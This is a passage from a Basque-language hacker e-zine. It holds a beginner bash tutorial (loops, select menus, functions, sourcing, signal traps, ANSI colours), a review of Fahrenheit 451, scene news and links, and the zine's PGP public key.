# begizta egikarituko da testak 0 itzuli arte (false)
while (test ${kont} -lt 100)
do
   kont=`expr $kont + 10`
done

echo "Kontagailuaren balioa: ${kont}"

# while amaigabea:
# while true; do eragiketa; done

###########################################
## UNTIL egitura 
# until baldintza
# do
#    eragiketa
# done
###########################################
# until begizta egikarituko da testak 0 ez den zerbait itzuli arte (true)
echo "UNTIL egitura -------"

until (test ${kont} -lt 0)
do
   kont=`expr $kont - 1` 
done

echo "Kontagailuaren balioa: $kont"

###########################################
## SELECT egitura
# select aldagaia in balio1 balio2 .. balioN
# do
#    eragiketa
# done
###########################################
# Select egitura DOSeko Choice antzekoa da.
# Zerrenda batean aukerak aurkezten ditu eta
# egokia den bat atera arte ez da bukatzen.
echo "SELECT egitura -------"

AUKERAK="Unix Debian RedHat NetBSD JakinOS X-evian"

select emaitza in ${AUKERAK}
do
 echo "Aukeratu balio egokia mesedez> ${emaitza}"
 # emaitza kate-luzera > 0 bada bukatu da
 (test ${#emaitza} -ne 0 ) && break
done

echo "Aukeratutako sistema: [${emaitza}] luzera ${#emaitza} da"
----------------------------8<-------------------------------------------------

+-----------+ 
| FUNTZIOAK |
+-----------+

Funtzioak ere defini daitezke. Definizioa oso oso xinplea da baina gutxienez
kode errepikakorra biltzeko aukera daukagu. Programa nagusiaren aldagaiak atzi
daitezke.

-------------------------------8<----------------------------------------------
#!/bin/sh

# funtzioak.sh - Espoz&Mina - Jakin ezine 7
# Funtzioen erabilpena

# aldagaiak
EMAITZA=0

# Erabili baino lehen, funtzioa definitu egin behar da
# derrigorrez.
pantailaratu () {
 echo "Balioak: $0> $1 eta $2 eta $3"
}

# Return erabil daiteke, baina zenbakizko balioa soilik itzul dezake
batuketa () {
	echo "Non gaude: ${FUNCNAME} funtzioan"
	echo "Parametroak: $1 eta $2"
	EMAITZA=`expr ${1} + ${2}` 
	return 0
}

# funtzioak errekurtsiboak izan daitezke
boom () {
	echo "ez egikaritu hau xD"
	boom
}

# Horrela egingo litzateke deia, parentesirik gabe
pantailaratu 3 4 "epa"

# Funtzio deia. Return 0 bada OK pantailaratuko da
batuketa 45 67 && echo "OK" || echo "errorea egon da"

echo "Emaitza: ${EMAITZA} $!"
----------------------------8<-------------------------------------------------

+--------------+ 
| LIBURUTEGIAK |
+--------------+

Bueno, liburuteagiak berez ez dire, baina script batean beste script baten kodea
erabil daiteke, horrekin kode berrerabilpena bermatuz.

-------------------------------8<----------------------------------------------
#!/bin/sh

# liburutegiak.sh - Espoz&Mina - Jakin ezine 7
# Kanpo fitxategien erabilpena, liburutegi moduan

# Ideia sinplea da, kanpo fitxategi batean funtzioak defini daitezke
# eta gero funtzio horien beste scriptetan sar daitezke

# Horrela egin daiteke
source funtzioak.sh

# Horrela egingo litzateke deia, parentesirik gabe
pantailaratu 69 123 "epa"

# Funtzio deia. Return 0 bada OK pantailaratuko da
batuketa 1337 3389 && echo "OK" || echo "errorea egon da"

echo "Emaitza: ${EMAITZA} $!"
----------------------------8<-------------------------------------------------

+-----------+ 
| SEINALEAK |
+-----------+

Are gehiago: scriptetan seinale kontrola sar daiteke! Hau agian ez da oso ezaguna
baina baliogarria izan daiteke.

-------------------------------8<----------------------------------------------
#!/bin/sh

# seinaleak.sh - Espoz&Mina - Jakin ezine 7
# Seinaleak jasotzeko adibideak
# Interesgarria izan daiteke script amaigabe baten kontrola
# eukitzeko bere egikaripena gelditu gabe.

funtzioa () {
  echo "seinalea jaso da: ${FUNCNAME} ${0}"
  #exit
}

# Ctrl-C CTRL-Z aginduei kasurik ez egiteko.ADI! prozesua KILL batekin akatu beharko da.
# trap ":" INT QUIT TSTP

# Kasu antzekoa, baina oraingo honetan seinalea jasotzen
# denean gure kodeara bideratuko dugu!!
trap "funtzioa" INT QUIT TSTP

# Begizta amaigabea, probak egiteko
while true
do
  sleep 2 
  echo "zZZZzzzZZz"
done

----------------------------8<-------------------------------------------------


+-------------+ 
| ANSI KODEAK |
+-------------+


--------------------------8<---------------------------------------------------

#!/bin/bash

# ansikodeak.sh
# ANSI kodeak probatzeko "echo -e" erabil daiteke escape karaktereakin batera \033
# echo -e flagarekin eskape karaktereak interpretarazten dizkiogu.

# Adib: \033[0m : defektuzko baliotara itzultzeko
# \033[40m: atzeko kolorea beltza.
# \033[40m\033[32m: atzeko kolorea beltza, gero aurreko kolore berdea ezarri

# Koloreak ikus ditzagun. echo bukaeran defektuzko balioak berreskuratzen dira
echo -e "\033[40m\033[37m  Txuria        \033[0m"
echo -e "\033[40m\033[1;37m  Gris argia   \033[0m"
echo -e "\033[40m\033[30m  Black        \033[0m (beltza)"
echo -e "\033[40m\033[1;30m  Grisa         \033[0m"
echo -e "\033[40m\033[31m  Gorria          \033[0m"
echo -e "\033[40m\033[1;31m  Gorri argia    \033[0m"
echo -e "\033[40m\033[32m  Berdea        \033[0m"
echo -e "\033[40m\033[1;32m  Berde argia  \033[0m"
echo -e "\033[40m\033[33m  Marroia        \033[0m"
echo -e "\033[40m\033[1;33m  Horia       \033[0m"
echo -e "\033[40m\033[34m  Urdina         \033[0m"
echo -e "\033[40m\033[1;34m  Urdin argia   \033[0m"
echo -e "\033[40m\033[35m  Purpura       \033[0m"
echo -e "\033[40m\033[1;35m  Arrosa         \033[0m"
echo -e "\033[40m\033[36m  Cyan         \033[0m"
echo -e "\033[40m\033[1;36m  Light Cyan argia   \033[0m"

# Atzeko kolore ezberdinak sar daitezke:
echo -e "\033[42m\033[31m  Jakin dezagun!!        \033[0m"

# atzeko kolore kodeak:
# [40m : beltza
# [41m : gorria
# [42m : berdea
# [43m : horia
# [44m : urdina
# [45m : purpura
# [46m : cyan
# [47m : txuria
# [49m : besterik ezeko balioa jarri (beltza)

# Bestelakoak. Bezeroaren arabera agian ez de behar bezala ikusten.
# Koloreekin konbinaketak egin daitezke ; erabiliz.
# [1m : negrita
# [3m : kursiba
# [4m : azpimarra
# [5m : blink
# [7m : alderantzizkoa: momentuko konbinazioaren alderantzizkoa.
# [9m : marraduna, marra bat karaktereen gainean.
# [22m : negrita kendu ([2m modu zaharrean)
# [23m : kursiba kendu
# [24m : azpimarra kendu
# [27m : alderantzizkoa kendu
# [29m : marra kendu
echo -e "\033[40m\033[4;33m  Horia         \033[0m"

----------------------------8<-------------------------------------------------


Askoz gehiago dago jakiteko. Nire gomendioa:
man bash

Ikusi arte!

exit 0




             -Espoz&Mina-
</0x08>




<0x09>
                        Kultura
                       ____________

Izenburua: Farenheit 451
Egilea: Ray Bradbury
Webgune: http://www.raybradbury.com/

Scene eritzi artiukuluan hacktibismoa aipatu da. Zalantzarik gabe
egungo pentsakera hacktibistarekin bat datorren liburua da hauxe.
Esan daiteke Ray Bradburyren libururik ezagunena dela "Cronicas Marcianas"ekin
batera.

Liburu motz honetan (170 orri inguru) etorkizun berezi bat aurkezten da:
liburuak irakurtzea erabat debekaturik dago, eta protagonista "suhiltzaile"
brigada bitxi baten langilea da; suak itzali ordez liburuak eta liburutegi
izkutuak erretzeko helburua dute. Izan ere, 451 gradu farenheit paperaren
erretze-puntua da. Murrizpen horren benetako jomuga jendea pozik bizitzea
da, arazoak ahaztuz. Gobernuak telebista kanal interaktiboak eskeintzen
ditu jendeak bere etxean ikus ditzan. Are gehiago, egongelek pareta osoa
betetzen duten pantaila bat baino gehiago daukate.

Baina protagonistak, Montag izenekoa, liburu bat izkutatu eta irakurtzen
du kuriosidadea dela eta. Hortik aurrera arazoak hasiko dira.

Jarraian liburuaren zatitxo bat euskaratu dizuet, itzela da. Hauexek dira
suhiltzaileen nagusiak Montag-i ematen dizkion arrazoiak liburuak debekatzeko:

"Ez baduzu nahi gizon bat politikoki tristea sentitzea, ez duzu arduratu behar,
ez zaizkio gauza bakar baten bi ikuspuntu ezberdin eman behar; bakar batekin
nahikoa du. Edo hobeto, bat ere ez eman. Gerra izeneko gauza bat existitzen
dela ahaztu arazi behar zaio. Gobernua egokiro jokatzen ez badu, intelektualegia
bada ala zergak igotzeko zalea bada hobe gauza guzti horiek izatea jendea horretaz
arduratzea baino. Lasaitasuna, Montag. Emaizkiozu jendeari lehiaketak non abesti
ezagunen letrak asmatuta irabazten den*, edo estatuaren hiriburuak gogoratzen
edo iaz Iowak zenbat arto produzitu zuen asmatzen den. Emaiozu baliorik gabeko
datu gainezkada**, egitate mordo batetan murgil itzazu, guztiz eguneratuta.
Orduantxe, pentsatzen dutela ondorioztatuko dute, mugitu gabe mugitzen direla
irudituko zaie***. Eta zoriontsuak izango dira, naturako gertaerak aldatzen ez
direlako. Ez eman Filosofia edo Soziologia bezalako jakintzarik eman bestela
gauzak antzemango dituzte."

* Duela gutxi TVE1 "la cancion de tu vida" telebista saioa egin zuen.
** Gogoratu telebistetan ematen diren ikestak eta datuak.
*** Internet horrela saltzen da ("azkarrago ibili","etxetik mugitu gabe munduan")


             -km-
</0x09>






<0x0A>

           Albisteak,Estekak,Agurrak
	  __________________________


[jakin]

jakin-ezine@lists.sourceforge.net
Zerrendan partu hartu nahi izanez gero, hauxe helbidea:
https://lists.sourceforge.net/lists/listinfo/jakin-ezine


Albiste izan dira
-----------------
* Hackmeeting: menorhack izenpean ospatu da aurtengo bilkura.

* kopyleft jardunaldiak donostian: hitzaldi interesgarri (Lessig) eta polemikoak (blogmail)
egondu ziren. Batzuk jeitsi daitezke: http://www.kopyleft.net/

* e-ghost taldearen udako ikastaroak: http://www.e-ghost.deusto.es/cursillosjulio/ ikaragarriak,
hauek bai jardunaldi emankorrak. Musutruk gainera!

* PHRACK #63: hacker ezinearen azken alea atera da. Gainera 7a69ko jendeak parte 
hartu du.
* NcN: Noconname izeneko bilkura egin da.

* SET #31 : estautuko ezine mitikoaren ale berria atera da.

* netsearch : ale berria ateratzeko asmoa dute. Jo irc hispanora, #netsearch kanalean.

* Zimmerman-ek VoIP-rentzako zifraketa sistema garatzeko asmoa dauka.


<JakinOS>
Sistema honen bertsio berezia atera da. MetaDistros-en oinarrituriko cdbizia da
LFS sistemarekin. Gainera edukin berezia dauaka, benetazko altxorra:
"Izotz Beltza"
Izotz Beltza izenpean underground ezine bilduma egin dugu. Ezagunenak eta 
ezezagunenak daude, azken aleak barne (phrack, set, e.a....)
Bota begirada:
http://sourceforge.net/project/showfiles.php?group_id=108573
</JakinOS>


Ez ahaztu hauexek direla ezinearen helbideak:

http://www.jakin.tk/
http://jakin.sourceforge.net/
http://jakinezine.galeon.com/

Eta email helbideak:
jakinezine@gmail.com
jakinezine@euskalerria.org
jakin@kaixo.com

CALL FOR PAPERS!!!
Zeren zain zaude? gai asko dauzkagu hitzegiteko: ASM, aribako sareak, spectrum :), algoritmo genetikoak, matematikak,
gai sozialak, hacktibismoa, hacker taldeak, istorioak, albisteak, proiektuak... Anima zaitezte!
Ez du garrantzirik gaiak errepikatzen badira, jasotzen duguna ongi-etorria izango da beti.


<Oharra>
Jakin ezinea ez da irakurleek bere kodeaz egiten duten erabileraren arduradun. Fanxinaren helburu bakarra
informatika teknikak erakustea da, dokumentaziotan, interneten, edonon dagoen informazioa modu ulerkor
batean laburtzea azken finean. Ohar tipiko hau sartzea beharrezkoa EZ dela deritzogu, baina badazpada
hemen da.
</Oharra>

                    __     __    _                _         
                __ / /__ _/ /__ (_)__    ___ ___ (_)__  ___ 
               / // / _ `/  '_// / _ \  / -_)_ // / _ \/ -_)
               \___/\_,_/_/\_\/_/_//_/  \__//__/_/_//_/\__/  
                             Hasiberriak betiko

					-edit-

</0x0A>




<gpg> 



jakinezine@gmail.com helbidera idatzi nahi bauduzu gpg erabiltzeko
aukera daukazu. Hona hemen gure gako publikoa.

inportatzeko modu azkar bat linuxetik:

wget -O - http://jakin.sf.net/jakingakoa.asc | gpg --import


-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v1.0.6 (GNU/Linux)
Comment: For info see http://www.gnupg.org

mQGiBEJiEvkRBADPSj1WP8k+fEd5AjCqxyD1xCQ+Vz2P28ofAjY1s3WYI4HPPs+i
hzprgnFa12dXyT6K36Khi3rtK4G5nf5ngo7jnk2w5vDbn6eeJ4JdUbXuz878IAal
PxJJ64A3sy+KLMuVz/TRy8LJmqiuB+AumX2VYhaapAA0LjBpOLq0vCbKWwCgzGrf
CGfOi938JB9kbRWXmdl4uJMD/0kRbGniFFzC7QoUvgISap5tAZ3R1YMsTc/6l1sY
gFaFLycex1l/N0wWlDCEWkZNbf6Wd//LSCN2uSBePL8hC7d+hMPeqss8E4+KHkB9
8J0B+4vC2M63XCwNZMbQaeEhviuFBFsN1zD60O3QXRre/OQMsO11lZvEB6MVoljP
f7gBA/0Yg/PEqp0XN9p0N5ma8Fz3TWxXRFh+DHxrrnS5JwHVtS7oOAK9+y/vEmi7
RJGVr0Q5JUhkB8gKVi/4kuaf6/u9X//oa5+6Z1Su9trXP2ZF+QIl8mNz0wzioVbw
cP2MZrmee/2IWAR7dnV5VtOI+/aUows2oiLaWYCWihuZKBBmKLQcamFraW4gPGph
a2luZXppbmVAZ21haWwuY29tPohdBBMRAgAdBQJCYhL5BQkB4TOABQsHCgMEAxUD
AgMWAgECF4AACgkQed2fkJCqXx2o1QCfZ+SyisCU8iRPRf6PfUFNbQMkDhQAoIF7
aDN+wsAbmCzYbE27u2WWfvDxuQINBEJiExkQCACocFKVNRQmagF7LaK2PuSDUBe8
BXW7K7Bx1p1kfFqp5A2EigwMN5aB3dfpJtkH+J5r7F6vTIoPRm+b5X95vhGmHtnb
kS3I0xbeW4lfEAMLyVnZEOE6W5zIGp6m/DAhO1h9DebieLObbU8FHNWjv56Uh0eu
Hf6Pnyqs7vO7a5slvX+HvWw9UzPi+g6/+zT4+Z7cZd8GjsONl6J2u7gUG5irhq1t
j68yI7zeB7sKGD8Lat5lJmt7LrzpPda5j19rmTEYPlU13ONJh8ujQ94kBAbYOHu0
TqB76Xet2fjqkYdXODsvPAszM30QkzXPAn9LuCjxQFIZ6wLllyHW1YXJEBsDAAMF
B/4gqSVZOps77QnID7Knw00yluLrwOvvLL5OscR+0YS0nYH3QdhdXKdZrgHMuJsc
L7vgT/ttmLT4vubPgJFSE6HTxd5vfIxoHTGDZ4v8LCZhahtL+O08/UX6xQrV4131
ckB0Meoe/F/SsVxj5jGYG2ka3blVuRtJviCE09hXeJ6tGWnrq+AyDimVGzEyGQMM
574Hd7Xc8qv05dCTXcLdY1beHqS24fpvEUkgOuVTN41+NIZSieIJ5Nksz4YcTvE8
XhwtHKCm6iSDv9kNX63RLZgGHhQnKaxJUYAnNwDMryXeiMVAyTFo0xkTre+k5IiI
/64USh34wG1ItttDs36JrlXPiEwEGBECAAwFAkJiExkFCQHhM4AACgkQed2fkJCq
Xx2IzgCeJEP0rTwi8LP5GkRCpuQLLt9BqywAnR4tPcHEURGrV7lZN8O5Wh12MvD9
=bJgN
-----END PGP PUBLIC KEY BLOCK-----

</gpg>

</jakin>